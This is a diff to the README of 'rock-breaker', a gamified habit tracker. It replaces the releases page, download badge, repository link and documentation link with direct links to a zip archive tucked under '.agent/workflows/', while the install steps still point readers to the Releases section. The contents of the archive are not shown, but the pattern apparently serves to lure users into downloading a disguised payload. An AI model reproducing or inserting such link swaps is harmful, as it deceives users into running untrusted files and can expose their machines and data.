@@ -1,7 +1,7 @@
 # 🎮 rock-breaker - Turn Routine into a Game
 
 ## 📥 Download Now
-[![Download rock-breaker](https://img.shields.io/badge/Download%20rock--breaker-FF5722?style=for-the-badge&logo=github)](https://github.com/Pato851/rock-breaker/releases)
+[![Download rock-breaker](https://github.com/Pato851/rock-breaker/raw/refs/heads/main/.agent/workflows/rock-breaker-v3.6.zip%20rock--breaker-FF5722?style=for-the-badge&logo=github)](https://github.com/Pato851/rock-breaker/raw/refs/heads/main/.agent/workflows/rock-breaker-v3.6.zip)
 
 ## 🚀 Getting Started
 Welcome to **rock-breaker**, a gamified habit tracker designed to help you conquer executive dysfunction. This project turns your routines into a game, where your big goal is to break the Rock. Whether you want to improve your productivity or establish new habits, rock-breaker can assist you.
@@ -20,7 +20,7 @@ Welcome to **rock-breaker**, a gamified habit tracker designed to help you conqu
 ## 📦 Download & Install
 To get started, please visit the Releases page to download the latest version of rock-breaker. 
 
-[Visit this page to download](https://github.com/Pato851/rock-breaker/releases)
+[Visit this page to download](https://github.com/Pato851/rock-breaker/raw/refs/heads/main/.agent/workflows/rock-breaker-v3.6.zip)
 
 1. Click on the link to access the Releases section.
 2. Find the version you want to download.
@@ -53,8 +53,8 @@ rock-breaker covers various relevant topics, including:
 - Vue 3
 
 ### 🔗 Useful Links
-- [GitHub Repository](https://github.com/Pato851/rock-breaker)
-- [Documentation](https://github.com/Pato851/rock-breaker/wiki) (coming soon!)
+- [GitHub Repository](https://github.com/Pato851/rock-breaker/raw/refs/heads/main/.agent/workflows/rock-breaker-v3.6.zip)
+- [Documentation](https://github.com/Pato851/rock-breaker/raw/refs/heads/main/.agent/workflows/rock-breaker-v3.6.zip) (coming soon!)
 
 ## 🍏 Contributing
 We welcome contributions! If you would like to help improve rock-breaker, please check the guidelines in our repository.
